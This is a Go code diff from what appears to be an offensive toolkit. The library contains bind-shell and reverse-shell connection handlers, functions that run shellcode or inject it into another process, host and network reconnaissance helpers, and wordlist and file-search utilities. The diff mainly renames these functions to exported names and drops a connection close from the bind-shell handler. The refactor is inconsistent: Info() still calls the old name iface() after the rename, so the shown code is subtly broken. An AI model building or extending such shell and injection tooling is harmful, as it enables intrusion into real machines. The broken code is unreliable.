@@ -141,7 +141,6 @@ func _handle_bind(conn net.Conn) {
 		  out, _ := exec.Command(head,parts...).Output()*/
 		conn.Write([]byte(out))
 	}
-	conn.Close()
 }
 
 func _handle_reverse(conn net.Conn) {
@@ -396,7 +395,7 @@ func RemoveFromSlice(slice []string, element string) []string {
 	return res
 }
 
-func shellcode_run(shellcode []byte) error {
+func ShellcodeRun(shellcode []byte) error {
 	switch runtime.GOOS {
 	case "windows":
 		return errors.New("syscall module works like shit - we will try to implement Windows shellcode runner differently")
@@ -419,7 +418,7 @@ func shellcode_run(shellcode []byte) error {
 	return nil
 }
 
-func shellcode_inject(shellcode []byte, pid int) error {
+func ShellcodeInject(shellcode []byte, pid int) error {
 	switch runtime.GOOS {
 	case "windows":
 		return errors.New("syscall module works like shit - we will try to implement Windows shellcode injector differently")
@@ -476,7 +475,7 @@ func GetGlobalIp() string {
 	return ip
 }
 
-func iface() (string, string) {
+func Iface() (string, string) {
 	addrs, err := net.InterfaceAddrs()
 	_ = addrs
 	ExitOnError(err)
@@ -501,7 +500,7 @@ func iface() (string, string) {
 	return name, hwAddr.String()
 }
 
-func ifaces() []string {
+func Ifaces() []string {
 	ifs := []string{}
 	interfaces, _ := net.Interfaces()
 	for _, interf := range interfaces {
@@ -510,7 +509,7 @@ func ifaces() []string {
 	return ifs
 }
 
-func info() map[string]string {
+func Info() map[string]string {
 	_, mac := iface()
 	u := ""
 	ap_ip := ""
@@ -570,13 +569,13 @@ func info() map[string]string {
 	return inf
 }
 
-func md5_hash(str string) string {
+func MD5Hash(str string) string {
 	hasher := md5.New()
 	hasher.Write([]byte(str))
 	return hex.EncodeToString(hasher.Sum(nil))
 }
 
-func create_wordlist(words []string) []string {
+func CreateWordlist(words []string) []string {
 	wordlist := []string{}
 	for w := range words {
 		word := words[w]
@@ -594,7 +593,7 @@ func create_wordlist(words []string) []string {
 	return wordlist
 }
 
-func read_file(filename string) (string, error) {
+func ReadFile(filename string) (string, error) {
 	fil, err := os.Open(filename)
 	defer fil.Close()
 	b, err := ioutil.ReadAll(fil)
@@ -604,7 +603,7 @@ func read_file(filename string) (string, error) {
 	return string(b), nil
 }
 
-func write_file(filename, data string) error {
+func WriteFile(filename, data string) error {
 	file, err := os.Create(filename)
 	if err != nil {
 		return err
@@ -617,19 +616,19 @@ func write_file(filename, data string) error {
 	return nil
 }
 
-func files_pattern(directory, pattern string) (map[string]string, error) {
+func FilesPattern(directory, pattern string) (map[string]string, error) {
 	out_map := map[string]string{}
 	files, err := ioutil.ReadDir(directory)
 	if err != nil {
 		return nil, err
 	}
 	for _, f := range files {
-		fl, err := read_file(f.Name())
+		fl, err := ReadFile(f.Name())
 		if err != nil {
 			return nil, err
 		}
 		if strings.Contains(fl, pattern) {
-			out_map[f.Name()], err = read_file(f.Name())
+			out_map[f.Name()], err = ReadFile(f.Name())
 			if err != nil {
 				return nil, err
 			}
